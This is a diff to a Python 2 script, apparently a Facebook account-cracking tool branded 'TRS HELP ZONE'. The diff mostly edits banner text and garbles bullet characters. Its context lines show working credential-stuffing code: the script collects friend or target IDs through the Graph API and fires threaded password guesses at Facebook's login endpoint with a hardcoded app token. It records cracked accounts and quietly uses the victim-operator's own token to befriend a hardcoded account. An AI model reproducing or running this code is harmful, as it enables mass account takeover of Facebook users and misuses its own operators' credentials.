@@ -91,7 +91,7 @@ logo = """
 \033[0;95m
 \033[0;91m\033[0;91mAUTHOR     :\033[0;92m IQUBAL SARKAR                    \033[0;91m        
 \033[0;91m\033[0;91mGITHUB     :\033[0;92m https://github.com/iqubal420   \033[0;91m       
-\033[0;91m\033[0;91mGROUP NAME :\033[0;92m TRS™ HELP ZONE                        \033[0;9        
+\033[0;91m\033[0;91mGROUP NAME :\033[0;92m TRS TEAM HELP ZONE                        \033[0;9        
 \033[0;91m\033[0;91mFB ACCOUNT    :\033[0;92m https://m.facebook.com/sarkar.saheb420\033[0;91m 
 \033[0;95m
 \033[1;94mDISCLAIMER
@@ -115,7 +115,7 @@ vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
  
 os.system("clear")
-print "\033[1;96m••••\033[1;92mIQUBAL SARKAR\033[1;96m••••"
+print "\033[1;96mâ€¢â€¢â€¢â€¢\033[1;92mIQUBAL SARKAR\033[1;96mâ€¢â€¢â€¢â€¢"
 jalan('\033[1;97m	                                    ')
 jalan('\033[1;97m                      :::!~!!!!!:. ')
 jalan('\033[1;97m                  .xUHWH!! !!?M88WHX:.')
@@ -123,7 +123,7 @@ jalan('\033[1;97m                .X*#M@$!!  !X!M$$$$$$WWx:.')
 jalan('\033[1;97m               :!!!!!!?H! :!$!$$$$$$$$$$8X:')
 jalan('\033[1;97m              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:')
 jalan('\033[1;97m             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!')
-jalan('\033[1;91m             ~!~!!!! .: TRS™ HELP ZONE$$$$RMM!')
+jalan('\033[1;91m             ~!~!!!! .: TRS TEAM HELP ZONE$$$$RMM!')
 jalan('\033[1;97m               !:~~~ .:!M"T#$$$$WX??#MRRMMM!')
 jalan('\033[1;97m               ~?WuxiW*`   `"#$$$$8!!!!??!!!')
 jalan('\033[1;97m             :X- M$$$$       `"T#$T~!8$WUXU~')
@@ -172,13 +172,13 @@ while (loop == 'true'):
 def login():
 	os.system('clear')
 	print logo
-	print "\033[1;93m-••-\033[1;91m> \033[1;92m1.\x1b[1;96m Login With Facebook  "
+	print "\033[1;93m-â€¢â€¢-\033[1;91m> \033[1;92m1.\x1b[1;96m Login With Facebook  "
         time.sleep(0.05)
-        print "\033[1;93m-••-\033[1;91m> \033[1;92m2.\x1b[1;95m Login With Token"
+        print "\033[1;93m-â€¢â€¢-\033[1;91m> \033[1;92m2.\x1b[1;95m Login With Token"
         time.sleep(0.05)
-        print "\033[1;93m-••-\033[1;91m> \033[1;92m3.\x1b[1;93m Get Access Token App Fb"
+        print "\033[1;93m-â€¢â€¢-\033[1;91m> \033[1;92m3.\x1b[1;93m Get Access Token App Fb"
         time.sleep(0.05)
-	print "\033[1;93m-••-\033[1;91m> \033[1;92m0.\033[1;91m Exit             "
+	print "\033[1;93m-â€¢â€¢-\033[1;91m> \033[1;92m0.\033[1;91m Exit             "
 	pilih_login()
  
 def pilih_login():
@@ -240,7 +240,7 @@ def login1():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;95mLogin Successful.••..'
+				print '\n\x1b[1;95mLogin Successful.â€¢â€¢..'
 				os.system('xdg-open https://facebook.com/sarkar.saheb420')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -288,10 +288,10 @@ def menu():
 	os.system("clear") #Dev:SARKAR SAHEB
         time.sleep(0.05)
 	print logo
-	print "\033[1;96m••••\033[1;92mSARKAR SAHEB\033[1;96m••••"
+	print "\033[1;96mâ€¢â€¢â€¢â€¢\033[1;92mSARKAR SAHEB\033[1;96mâ€¢â€¢â€¢â€¢"
 	print "\033[1;96m[\033[1;97m\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;97m"+Name+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;97m"+id+"\x1b[1;97m              "
-	print "\033[1;96m••••\033[1;92mSARKAR SAHEB\033[1;96m••••"
+	print "\033[1;96mâ€¢â€¢â€¢â€¢\033[1;92mSARKAR SAHEB\033[1;96mâ€¢â€¢â€¢â€¢"
 	print "\x1b[1;96m[\x1b[1;93m1\x1b[1;96m]\x1b[1;93m Hack Facebook Account"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Logout            "
 	pilih()
@@ -325,9 +325,9 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\033[1;96m••••\033[1;92mSARKAR VAU\033[1;96m••••"
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m] \033[1;93mApni hack from your I'd friends"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m] \033[1;93mApny hack from public I'd"
+	print "\033[1;96mâ€¢â€¢â€¢â€¢\033[1;92mSARKAR VAU\033[1;96mâ€¢â€¢â€¢â€¢"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m] \033[1;93mHack from your I'd friends"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m] \033[1;93mHack from public I'd"
 	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m] \033[1;93mList hack from file"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m] \033[1;91mBack"
 	pilih_super()
@@ -340,7 +340,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;96m••••\033[1;92mIQUBAL SARKAR\033[1;96m••••"
+		print "\033[1;96mâ€¢â€¢â€¢â€¢\033[1;92mIQUBAL SARKAR\033[1;96mâ€¢â€¢â€¢â€¢"
 		jalan('\033[1;96m[] \033[1;93mSearching ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -349,7 +349,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		print "\033[1;96m••••\033[1;92mIQUBAL SARKAR\033[1;96m••••"
+		print "\033[1;96mâ€¢â€¢â€¢â€¢\033[1;92mIQUBAL SARKAR\033[1;96mâ€¢â€¢â€¢â€¢"
 		idt = raw_input("\033[1;96m[+] \033[1;37mEnter Friend ID \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -367,7 +367,7 @@ def pilih_super():
 	elif peak =="3":
 		os.system('clear')
 		print logo
-		print "\033[1;96m••••\033[1;92mIQUBAL SARKAR\033[1;96m••••"
+		print "\033[1;96mâ€¢â€¢â€¢â€¢\033[1;92mIQUBAL SARKAR\033[1;96mâ€¢â€¢â€¢â€¢"
 		try:
 			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mInput Name file  \x1b[1;91m: \x1b[1;97m')
 			for line in open(idlist,'r').readlines():
@@ -392,7 +392,7 @@ def pilih_super():
 	print
 	print('\x1b[1;96m[!] \033[1;92mStop CTRL+z')
 	time.sleep(0.05)
-	print "\033[1;96m••••\033[1;92mSARKAR VAU\033[1;96m••••"
+	print "\033[1;96mâ€¢â€¢â€¢â€¢\033[1;92mSARKAR VAU\033[1;96mâ€¢â€¢â€¢â€¢"
 	print ('\033[1;96m[\033[1;92mO\033[1;93mR\033[1;96m]  \033[1;93m    User ID    \033[1;96m| \033[1;93mPassword \033[1;96m  - \033[1;93m ID Name')
 			
 	def main(arg):
@@ -409,7 +409,7 @@ def pilih_super():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;96m[\x1b[1;92mTRS™ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
+				print '\x1b[1;96m[\x1b[1;92mTRSâ„¢ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1 + ' - ' + b['name']
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
@@ -423,7 +423,7 @@ def pilih_super():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[1;96m[\x1b[1;92mTRS™ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
+						print '\x1b[1;96m[\x1b[1;92mTRSâ„¢ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2 + ' - ' + b['name']
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
@@ -437,7 +437,7 @@ def pilih_super():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;96m[\x1b[1;92mTRS™ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
+								print '\x1b[1;96m[\x1b[1;92mTRSâ„¢ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3 + ' - ' + b['name']
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
@@ -451,7 +451,7 @@ def pilih_super():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
-										print '\x1b[1;96m[\x1b[1;92mTRS™HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
+										print '\x1b[1;96m[\x1b[1;92mTRSâ„¢HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4 + ' - ' + b['name']
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
@@ -479,7 +479,7 @@ def pilih_super():
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
-														print '\x1b[1;96m[\x1b[1;92mTRS™ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
+														print '\x1b[1;96m[\x1b[1;92mTRSâ„¢ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6 + ' - ' + b['name']
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
@@ -493,7 +493,7 @@ def pilih_super():
 										                                 	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 										                        	        q = json.load(data)
 										                                 	if 'access_token' in q:
-											                                	print '\x1b[1;96m[\x1b[1;92mTRS™ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
+											                                	print '\x1b[1;96m[\x1b[1;92mTRSâ„¢ HELP ZONE\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7 + ' - ' + b['name']
 											                                	oks.append(user+pass7)
 										                                	else:
 											                                   	if 'www.facebook.com' in q["error_msg"]:
@@ -507,7 +507,7 @@ def pilih_super():
          
         p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;96m••••\033[1;92mTRS™ HELP ZONE\033[1;96m••••"
+	print "\033[1;96mâ€¢â€¢â€¢â€¢\033[1;92mTRS TEAM HELP ZONE\033[1;96mâ€¢â€¢â€¢â€¢"
 	print '\033[1;96m[\033[1;97m\033[1;96m] \033[1;92mProcess Complete \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal HACK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mCP File Saved \033[1;91m: \033[1;97mout/super_cp.txt")
